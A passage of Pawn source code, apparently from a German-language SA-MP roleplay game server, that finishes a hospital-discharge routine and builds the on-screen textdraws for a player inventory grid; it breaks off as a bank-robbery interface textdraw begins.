		Auftragaktiv[playerid] = 0;
		GebeGeld(playerid,-20);
		Fraktionskasse[3] += 20.0;
		Frakkassespeichern(3);
		Fraktionskasse[4] += 20.0;
		Frakkassespeichern(4);
		SendClientMessage(playerid,COLOR_ORANGE,"Du wurdest aus dem Krankenhaus entlassen. Behandlungskosten: 20$");
    }
    return 1;
}
forward Inventardraws(playerid);
public Inventardraws(playerid)
{
    SpielerInventarText[playerid][0] = CreatePlayerTextDraw(playerid, 551.000000, 122.000000, "_");
	PlayerTextDrawBackgroundColor(playerid, SpielerInventarText[playerid][0], 255);
	PlayerTextDrawFont(playerid, SpielerInventarText[playerid][0], 1);
	PlayerTextDrawLetterSize(playerid, SpielerInventarText[playerid][0], 0.899999, 32.300025);
	PlayerTextDrawColor(playerid, SpielerInventarText[playerid][0], -1);
	PlayerTextDrawSetOutline(playerid, SpielerInventarText[playerid][0], 0);
	PlayerTextDrawSetProportional(playerid, SpielerInventarText[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, SpielerInventarText[playerid][0], 1);
	PlayerTextDrawUseBox(playerid, SpielerInventarText[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid, SpielerInventarText[playerid][0], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][0], 86.000000, 0.000000);

	SpielerInventarText[playerid][1] = CreatePlayerTextDraw(playerid, 551.000000, 219.000000, "_");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][1], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][1], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][1], 0.500000, 0.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][1], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][1], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][1], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][1], 1);
	PlayerTextDrawUseBox			(playerid, SpielerInventarText[playerid][1], 1);
	PlayerTextDrawBoxColor			(playerid, SpielerInventarText[playerid][1], 255);
	PlayerTextDrawTextSize			(playerid, SpielerInventarText[playerid][1], 86.000000, 0.000000);

	SpielerInventarText[playerid][2] = CreatePlayerTextDraw(playerid, 551.000000, 316.000000, "_");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][2], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][2], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][2], 0.500000, 0.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][2], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][2], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][2], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][2], 1);
	PlayerTextDrawUseBox			(playerid, SpielerInventarText[playerid][2], 1);
	PlayerTextDrawBoxColor			(playerid, SpielerInventarText[playerid][2], 255);
	PlayerTextDrawTextSize			(playerid, SpielerInventarText[playerid][2], 86.000000, 0.000000);

	SpielerInventarText[playerid][3] = CreatePlayerTextDraw(playerid, 183.000000, 122.000000, "_");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][3], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][3], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][3], 0.500000, 32.299999);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][3], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][3], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][3], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][3], 1);
	PlayerTextDrawUseBox			(playerid, SpielerInventarText[playerid][3], 1);
	PlayerTextDrawBoxColor			(playerid, SpielerInventarText[playerid][3], 255);
	PlayerTextDrawTextSize			(playerid, SpielerInventarText[playerid][3], 177.000000, 0.000000);

	SpielerInventarText[playerid][4] = CreatePlayerTextDraw(playerid, 275.000000, 122.000000, "_");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][4], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][4], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][4], 0.500000, 32.299999);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][4], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][4], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][4], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][4], 1);
	PlayerTextDrawUseBox			(playerid, SpielerInventarText[playerid][4], 1);
	PlayerTextDrawBoxColor			(playerid, SpielerInventarText[playerid][4], 255);
	PlayerTextDrawTextSize			(playerid, SpielerInventarText[playerid][4], 269.000000, 0.000000);

	SpielerInventarText[playerid][5] = CreatePlayerTextDraw(playerid, 367.000000, 122.000000, "_");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][5], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][5], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][5], 0.500000, 32.299999);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][5], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][5], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][5], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][5], 1);
	PlayerTextDrawUseBox			(playerid, SpielerInventarText[playerid][5], 1);
	PlayerTextDrawBoxColor			(playerid, SpielerInventarText[playerid][5], 255);
	PlayerTextDrawTextSize			(playerid, SpielerInventarText[playerid][5], 361.000000, 0.000000);

	SpielerInventarText[playerid][6] = CreatePlayerTextDraw(playerid, 459.000000, 122.000000, "_");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][6], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][6], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][6], 0.500000, 32.299999);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][6], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][6], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][6], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][6], 1);
	PlayerTextDrawUseBox			(playerid, SpielerInventarText[playerid][6], 1);
	PlayerTextDrawBoxColor			(playerid, SpielerInventarText[playerid][6], 255);
	PlayerTextDrawTextSize			(playerid, SpielerInventarText[playerid][6], 453.000000, 0.000000);

	SpielerInventarText[playerid][7] = CreatePlayerTextDraw(playerid, 87.000000, 120.000000, " ");//89
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][7], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][7],92,98);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][7], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][7], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][7], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][7], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][7], 1);

	SpielerInventarText[playerid][8] = CreatePlayerTextDraw(playerid, 181.500000, 120.000000, " ");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][8], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][8],89,98);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][8], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][8], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][8], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][8], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][8], 1);

	SpielerInventarText[playerid][9] = CreatePlayerTextDraw(playerid, 273.500000, 120.000000, " ");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][9], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][9],89,98);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][9], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][9], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][9], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][9], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][9], 1);

	SpielerInventarText[playerid][10] = CreatePlayerTextDraw(playerid, 366.000000, 120.000000, " ");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][10], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][10],89,98);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][10], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][10], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][10], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][10], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][10], 1);

	SpielerInventarText[playerid][11] = CreatePlayerTextDraw(playerid, 458.000000, 120.000000, " ");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][11], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][11],91,98);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][11], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][11], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][11], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][11], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][11], 1);

	SpielerInventarText[playerid][12] = CreatePlayerTextDraw(playerid, 87.000000, 221.000000, " ");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][12], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][12],92,94);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][12], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][12], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][12], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][12], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][12], 1);

	SpielerInventarText[playerid][13] = CreatePlayerTextDraw(playerid, 181.500000, 221.000000, " ");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][13], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][13],89,94);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][13], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][13], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][13], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][13], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][13], 1);

	SpielerInventarText[playerid][14] = CreatePlayerTextDraw(playerid, 273.500000, 221.000000, " ");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][14], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][14],89,94);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][14], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][14], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][14], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][14], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][14], 1);

	SpielerInventarText[playerid][15] = CreatePlayerTextDraw(playerid, 366.000000, 221.000000, " ");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][15], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][15],89,94);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][15], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][15], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][15], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][15], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][15], 1);

	SpielerInventarText[playerid][16] = CreatePlayerTextDraw(playerid, 458.000000, 221.000000, " ");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][16], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][16],91,94);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][16], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][16], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][16], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][16], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][16], 1);

	SpielerInventarText[playerid][17] = CreatePlayerTextDraw(playerid, 87.000000, 318.000000, " ");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][17], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][17],92,96);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][17], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][17], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][17], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][17], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][17], 1);

	SpielerInventarText[playerid][18] = CreatePlayerTextDraw(playerid, 181.500000, 318.000000, " ");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][18], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][18],89,96);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][18], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][18], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][18], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][18], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][18], 1);

	SpielerInventarText[playerid][19] = CreatePlayerTextDraw(playerid, 273.500000, 318.000000, " ");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][19], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][19],89,96);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][19], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][19], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][19], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][19], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][19], 1);

	SpielerInventarText[playerid][20] = CreatePlayerTextDraw(playerid, 366.000000, 318.000000, " ");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][20], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][20],89,96);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][20], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][20], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][20], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][20], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][20], 1);

	SpielerInventarText[playerid][21] = CreatePlayerTextDraw(playerid, 458.000000, 318.000000, " ");
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][21], 1786416603);
	PlayerTextDrawTextSize(playerid, SpielerInventarText[playerid][21],91,96);//1. breite
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][21], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][21], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][21], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][21], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][21], 1);
	//Inventar Zahlen
	SpielerInventarText[playerid][22] = CreatePlayerTextDraw(playerid, 178.000000, 209.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][22], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][22], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][22], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][22], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][22], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][22], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][22], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][22], 0);

	SpielerInventarText[playerid][23] = CreatePlayerTextDraw(playerid, 270.000000, 209.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][23], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][23], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][23], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][23], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][23], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][23], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][23], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][23], 0);

	SpielerInventarText[playerid][24] = CreatePlayerTextDraw(playerid, 362.000000, 209.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][24], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][24], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][24], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][24], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][24], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][24], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][24], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][24], 0);

	SpielerInventarText[playerid][25] = CreatePlayerTextDraw(playerid, 454.000000, 209.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][25], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][25], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][25], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][25], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][25], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][25], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][25], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][25], 0);

	SpielerInventarText[playerid][26] = CreatePlayerTextDraw(playerid, 549.000000, 209.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][26], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][26], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][26], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][26], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][26], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][26], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][26], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][26], 0);
	//2
	SpielerInventarText[playerid][27] = CreatePlayerTextDraw(playerid, 178.000000, 306.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][27], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][27], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][27], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][27], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][27], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][27], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][27], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][27], 0);

	SpielerInventarText[playerid][28] = CreatePlayerTextDraw(playerid, 270.000000, 306.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][28], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][28], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][28], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][28], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][28], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][28], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][28], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][28], 0);

	SpielerInventarText[playerid][29] = CreatePlayerTextDraw(playerid, 362.000000, 306.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][29], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][29], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][29], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][29], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][29], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][29], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][29], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][29], 0);

	SpielerInventarText[playerid][30] = CreatePlayerTextDraw(playerid, 454.000000, 306.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][30], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][30], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][30], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][30], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][30], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][30], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][30], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][30], 0);

	SpielerInventarText[playerid][31] = CreatePlayerTextDraw(playerid, 549.000000, 306.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][31], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][31], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][31], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][31], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][31], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][31], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][31], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][31], 0);
	//3
	SpielerInventarText[playerid][32] = CreatePlayerTextDraw(playerid, 178.000000, 406.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][32], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][32], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][32], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][32], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][32], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][32], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][32], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][32], 0);

	SpielerInventarText[playerid][33] = CreatePlayerTextDraw(playerid, 270.000000, 406.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][33], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][33], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][33], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][33], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][33], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][33], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][33], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][33], 0);

	SpielerInventarText[playerid][34] = CreatePlayerTextDraw(playerid, 362.000000, 406.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][34], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][34], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][34], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][34], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][34], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][34], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][34], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][34], 0);

	SpielerInventarText[playerid][35] = CreatePlayerTextDraw(playerid, 454.000000, 406.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][35], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][35], 355);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][35], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][35], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][35], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][35], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][35], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][35], 0);

	SpielerInventarText[playerid][36] = CreatePlayerTextDraw(playerid, 549.000000, 406.000000, "0");
	PlayerTextDrawAlignment(playerid, SpielerInventarText[playerid][36], 3);
	PlayerTextDrawBackgroundColor	(playerid, SpielerInventarText[playerid][36], 255);
	PlayerTextDrawFont				(playerid, SpielerInventarText[playerid][36], 1);
	PlayerTextDrawLetterSize		(playerid, SpielerInventarText[playerid][36], 0.500000, 1.000000);
	PlayerTextDrawColor				(playerid, SpielerInventarText[playerid][36], -1);
	PlayerTextDrawSetOutline		(playerid, SpielerInventarText[playerid][36], 0);
	PlayerTextDrawSetProportional	(playerid, SpielerInventarText[playerid][36], 1);
	PlayerTextDrawSetShadow			(playerid, SpielerInventarText[playerid][36], 0);

	SpielerInventarText[playerid][37] = CreatePlayerTextDraw(playerid,93.000000, 108.000000, "schliessen");
	PlayerTextDrawBackgroundColor(playerid,SpielerInventarText[playerid][37], 255);
	PlayerTextDrawFont(playerid,SpielerInventarText[playerid][37], 1);
	PlayerTextDrawLetterSize(playerid,SpielerInventarText[playerid][37], 0.270000, 1.000000);
	PlayerTextDrawColor(playerid,SpielerInventarText[playerid][37], -1);
	PlayerTextDrawSetOutline(playerid,SpielerInventarText[playerid][37], 0);
	PlayerTextDrawSetProportional(playerid,SpielerInventarText[playerid][37], 1);
	PlayerTextDrawSetShadow(playerid,SpielerInventarText[playerid][37], 1);
	PlayerTextDrawUseBox(playerid,SpielerInventarText[playerid][37], 1);
	PlayerTextDrawBoxColor(playerid,SpielerInventarText[playerid][37], 255);
	PlayerTextDrawTextSize(playerid,SpielerInventarText[playerid][37], 136.000000, 8.000000);
	PlayerTextDrawSetSelectable(playerid,SpielerInventarText[playerid][37], 1);
}
forward PlayerTextdraws(playerid);
public PlayerTextdraws(playerid)
{

    Bankklau[playerid][0] = CreatePlayerTextDraw(playerid,609.000000, 120.000000, "         ");
	PlayerTextDrawBackgroundColor(playerid,Bankklau[playerid][0], 255);
	PlayerTextDrawFont(playerid,Bankklau[playerid][0], 2);
	PlayerTextDrawLetterSize(playerid,Bankklau[playerid][0], 0.670000, 0.100000);
	PlayerTextDrawColor(playerid,Bankklau[playerid][0], -1);
	PlayerTextDrawSetOutline(playerid,Bankklau[playerid][0], 0);
